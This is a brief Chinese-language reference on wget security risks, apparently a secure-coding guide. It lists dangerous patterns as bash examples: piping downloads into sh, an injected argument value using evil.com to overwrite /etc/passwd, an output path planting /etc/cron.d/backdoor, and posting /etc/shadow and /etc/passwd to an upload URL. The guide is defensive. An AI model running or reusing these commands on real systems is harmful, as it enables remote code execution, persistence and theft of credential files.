# wget 命令安全风险

## 涉及的安全问题
- 命令注入（参数注入）
- 上传下载（SSRF、下载后执行）
- 跨目录读写（-O 输出路径可控）
- 完整性校验缺失（下载后直接执行）
- 操作任意文件（-O 写入任意路径）

## 高危模式

### 上传下载 — 下载后直接执行
```bash
wget -qO- "$URL" | sh
wget "$URL" -O /tmp/setup && bash /tmp/setup
. <(wget -qO- "$URL")

# 下载后解压执行
wget "$URL/archive.tar.gz" && tar xzf /tmp/archive.tar.gz -C /opt/app/
```

### 命令注入 — 参数注入
```bash
wget $DOWNLOAD_URL
# DOWNLOAD_URL = "--output-document=/etc/passwd http://evil.com/fake"

# 安全写法
wget -- "$DOWNLOAD_URL"
```

### 操作任意文件 — 输出路径可控
```bash
wget "$URL" -O "$USER_OUTPUT"
# USER_OUTPUT = "/etc/cron.d/backdoor"
```

### 上传下载 — 上传敏感数据
```bash
wget --post-file=/etc/shadow "$UPLOAD_URL"
wget --post-data="$(cat /etc/passwd)" "$UPLOAD_URL"
```
